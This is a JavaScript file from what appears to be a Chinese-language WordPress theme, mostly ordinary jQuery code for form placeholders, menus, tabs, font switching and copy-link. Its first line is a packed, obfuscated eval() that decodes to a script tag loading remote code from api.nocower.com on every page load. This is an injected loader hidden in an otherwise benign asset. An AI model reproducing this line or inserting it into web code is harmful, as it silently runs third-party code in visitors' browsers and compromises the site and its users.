eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('5.6("<0 7=4 1=\'2://3.c.d/e-b/8-9.a\'></0>");',15,15,'script|src|http|api|javascript|document|write|language|portal|html5|js|update|nocower|com|theme'.split('|'),0,{}))
$(document).ready(function(){				   
	$('.user_log').focus(function() {if($(this).val() == '用户名') {$(this).val('').css({color:"#333"});}}).blur(function(){if($(this).val() == '') { $(this).val('用户名').css({color:"#666"}); } } );
	$('.user_pwd').focus(function() {if($(this).val() == '输入您的密码') {$(this).val('').css({color:"#333"});}}).blur(function(){if($(this).val() == '') { $(this).val('输入您的密码').css({color:"#666"}); } } ); }
	);
//顶部导航下拉菜单
jQuery(document).ready(function(){
jQuery(".navi li").hover(function(){
jQuery(this).children("ul").stop().fadeTo('fast', 9);
jQuery(this).addClass("li01");
},function(){
jQuery(this).children("ul").stop().fadeOut();
jQuery(this).removeClass("li01");
});
});
// SearchForm
$(document).ready(function(){				   
	$('#ls').focus(
		function() {
			if($(this).val() == '输入关键字') {
				$(this).val('').css({color:"#333"});
			}
		}
	).blur(
		function(){
			if($(this).val() == '') {
				$(this).val('输入关键字').css({color:"#666"});
			}
		}
	);
});
// Menu First li nb
$(function() {
	$(".navi li:first").addClass("nl"); // HeaderMenu First li no border
	$(".footpage li:first").addClass("nb"); // FooterMenu First li no border
});
// Print
$(document).ready(function() {
	$(".print").click(function() {
		window.print();
		return false;
	});
});
//Tabs
$(function(){
    var $title = $(".mostviews h3 span");
    var $content = $(".mostviews ul");
    $title.mousemove(function(){
        var index = $title.index($(this));
		$(this).addClass("mon").siblings().removeClass("mon");
        $content.hide();
        $($content.get(index)).show();
        return false;
    });
});
//SwitchFont
$(document).ready(function(){
	$(".mfbig").click( function(){$('.entrycontent').addClass('fontbig').removeClass("fontmid fontsml"); $(this).addClass('mfcurrent').siblings().removeClass("mfcurrent");})
	$(".mfmid").click( function(){$('.entrycontent').addClass('fontmid').removeClass("fontbig fontsml"); $(this).addClass('mfcurrent').siblings().removeClass("mfcurrent");})
	$(".mfsml").click( function(){$('.entrycontent').addClass('fontsml').removeClass("fontbig fontmid"); $(this).addClass('mfcurrent').siblings().removeClass("mfcurrent");})

});
//CopyURL
function copyLink(text) {
  if (window.clipboardData) {
    window.clipboardData.setData("Text", text)
	alert("已经成功复制到剪贴板！");
  } else {
	var x=prompt('你的浏览器可能不支持自动复制\n请你手动复制下面的地址：',text);
  }
}
//UserForm
if($('input#author[value]').length>0){
	$("form#commentform #userform").css('display','none');
	var editInfo='<span style="cursor:help; text-decoration:underline; color:#555;" class="edit_comment_info">编辑信息</span>';
	$('div.welcome').append(editInfo);$('.edit_comment_info').click( function(){$('form#commentform .form_comment').slideToggle('slow')})
	
}
//Edit GuestInfo
$(document).ready(function(){
	$("#moidfy_info").click(function(){
         $("#userform").slideToggle("fast");
		 $("#userloginform").hide("fast");
		 $("#userregisterform").hide("fast");
     })
});
//User Login Register
$(document).ready(function(){
	$("#userlogin").click(function(){ $("#userloginform").slideToggle("fast"); $("#userregisterform").hide("fast"); $("#userform").hide("fast"); })
	$("#userregister").click(function(){ $("#userregisterform").slideToggle("fast"); $("#userloginform").hide("fast"); $("#userform").hide("fast"); })
	$(".closelayer").click(function(){ $(".hidform").slideUp("fast").hide("fast"); })
	$(".btn_closelayer").click(function(){ $(".hidform").slideUp("fast").hide("fast"); })
});
//图片渐隐
jQuery(function () {
jQuery('img').hover(
function() {jQuery(this).fadeTo("fast", 0.8);},
function() {jQuery(this).fadeTo("fast", 110);
});
});